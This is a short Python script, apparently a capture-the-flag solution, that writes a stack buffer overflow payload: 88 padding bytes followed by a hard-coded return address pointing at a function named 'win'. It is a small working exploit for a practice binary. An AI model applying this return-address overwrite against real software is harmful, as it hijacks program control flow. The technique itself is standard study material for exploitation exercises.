#!/usr/bin/env python3

from struct import pack

payload = b'a' * 88

# The address of the function win
payload += pack("<Q", 0x40205c)

with open("payload", "wb") as f:
    f.write(payload)